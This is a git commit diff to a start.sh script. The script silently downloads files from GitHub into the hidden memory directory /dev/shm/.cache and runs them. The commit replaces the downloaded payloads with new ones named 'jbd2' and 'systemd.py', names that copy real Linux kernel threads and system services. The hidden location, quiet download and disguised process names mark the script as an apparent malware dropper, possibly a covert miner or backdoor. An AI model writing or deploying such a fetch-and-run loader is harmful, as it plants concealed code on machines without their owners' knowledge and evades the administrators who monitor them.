6e550127fd28e2e50ca6882f104063192b282bee
ANTI VIRAL <109937537+ANTI-VIRAL@users.noreply.github.com>
2025-06-08 13:40:38 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -7,10 +7,10 @@ chmod 700 /dev/shm/.cache
 cd /dev/shm/.cache
 
 wget -q \
-    https://github.com/ANTI-VIRAL/MACHINE/raw/main/cc \
-    https://github.com/ANTI-VIRAL/sshd/raw/main/kthreadd.py 
+    https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
+    https://github.com/ANTI-VIRAL/sshd/raw/main/systemd.py 
 
-chmod +x cc kthreadd.py
+chmod +x jbd2 systemd.py
 
 # Start program
-exec python3 kthreadd.py
+exec python3 systemd.py
